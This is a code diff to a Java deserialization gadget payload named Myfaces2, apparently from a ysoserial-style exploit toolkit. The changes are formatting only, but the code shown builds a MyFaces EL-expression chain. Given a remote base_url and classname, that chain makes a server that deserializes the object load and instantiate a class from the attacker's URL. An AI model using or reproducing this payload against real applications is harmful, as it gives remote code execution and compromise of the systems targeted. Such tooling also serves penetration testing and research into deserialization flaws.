@@ -10,20 +10,19 @@ import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 
 /**
- *
  * ValueExpressionImpl.getValue(ELContext)
  * ValueExpressionMethodExpression.getMethodExpression(ELContext)
  * ValueExpressionMethodExpression.getMethodExpression()
  * ValueExpressionMethodExpression.hashCode()
  * HashMap<K,V>.hash(Object)
  * HashMap<K,V>.readObject(ObjectInputStream)
- *
+ * <p>
  * Arguments:
  * - base_url:classname
- *
+ * <p>
  * Yields:
  * - Instantiation of remotely loaded class
- *
+ * <p>
  * Requires:
  * - MyFaces
  * - Matching EL impl (setup POM deps accordingly, so that the ValueExpression can be deserialized)
@@ -60,7 +59,7 @@ public class Myfaces2 implements ObjectPayload<Object> {
 
     public Object getChain(String command) throws Exception {
         int sep = command.lastIndexOf(':');
-        if ( sep < 0 ) {
+        if (sep < 0) {
             throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
         }
 
@@ -71,7 +70,7 @@ public class Myfaces2 implements ObjectPayload<Object> {
         String expr = "${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}";
 
         // if we add fewer than the actual classloaders we end up with a null entry
-        for ( int i = 0; i < 100; i++ ) {
+        for (int i = 0; i < 100; i++) {
             expr += "${request.getAttribute('arr').add(request.servletContext.getResource('/').toURI().create('" + url + "').toURL())}";
         }
         expr += "${request.getClass().getClassLoader().newInstance(request.getAttribute('arr')"
